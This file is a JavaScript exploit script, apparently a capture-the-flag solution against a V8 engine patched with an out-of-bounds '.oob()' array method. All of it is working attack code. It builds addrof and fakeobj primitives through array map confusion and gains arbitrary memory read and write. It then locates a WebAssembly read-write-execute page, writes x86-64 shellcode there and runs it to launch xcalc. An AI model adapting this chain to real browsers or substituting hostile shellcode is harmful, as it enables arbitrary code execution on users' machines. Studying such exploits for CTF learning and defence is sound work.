/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

/// Construct addrof primitive
var obj = {"A":1};
var obj_arr = [obj];
var float_arr = [1.1, 1.2, 1.3, 1.4];
var obj_arr_map = obj_arr.oob();
var float_arr_map = float_arr.oob();

function addrof(in_obj) {
    // First, put the obj whose address we want to find into index 0
    obj_arr[0] = in_obj;

    // Change the obj array's map to the float array's map
    obj_arr.oob(float_arr_map);

    // Get the address by accessing index 0
    let addr = obj_arr[0];

    // Set the map back
    obj_arr.oob(obj_arr_map);

    // Return the address as a BigInt
    return ftoi(addr);
}

function fakeobj(addr) {
    // First, put the address as a float into index 0 of the float array
    float_arr[0] = itof(addr);

    // Change the float array's map to the obj array's map
    float_arr.oob(obj_arr_map);

    // Get a "fake" object at that memory location and store it
    let fake = float_arr[0];

    // Set the map back
    float_arr.oob(float_arr_map);

    // Return the object
    return fake;
}
// This array is what we will use to read from and write to arbitrary memory addresses
var arb_rw_arr = [float_arr_map, 1.2, 1.3, 1.4];

console.log("[+] Controlled float array: 0x" + addrof(arb_rw_arr).toString(16));

function arb_read(addr) {
    // We have to use tagged pointers for reading, so we tag the addr
    if (addr % 2n == 0)
	addr += 1n;

    // Place a fakeobj right on top of our crafted array with a float array map
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);

    // Change the elements pointer using our crafted array to read_addr-0x10
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);

    // Index 0 will then return the value at read_addr
    return ftoi(fake[0]);
}

function initial_arb_write(addr, val) {
    // Place a fakeobj right on top of our crafted array with a float array map
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);

    // Change the elements pointer using our crafted array to write_addr-0x10
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);

    // Write to index 0 as a floating point value
    fake[0] = itof(BigInt(val));
}

console.log("[+] Creating an RWX page using WebAssembly");

// https://wasdk.github.io/WasmFiddle/
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

var rwx_page_addr = arb_read(addrof(wasm_instance)-1n+0x88n);

console.log("[+] RWX Wasm page addr: 0x" + rwx_page_addr.toString(16));

function copy_shellcode(addr, shellcode) {
    let buf = new ArrayBuffer(0x100);
    let dataview = new DataView(buf);
    let buf_addr = addrof(buf);
    let backing_store_addr = buf_addr + 0x20n;
    initial_arb_write(backing_store_addr, addr);

    for (let i = 0; i < shellcode.length; i++) {
	dataview.setUint32(4*i, shellcode[i], true);
    }
}

// https://xz.aliyun.com/t/5003
var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];

console.log("[+] Copying xcalc shellcode to RWX page");

copy_shellcode(rwx_page_addr, shellcode);

console.log("[+] Popping calc");

f();
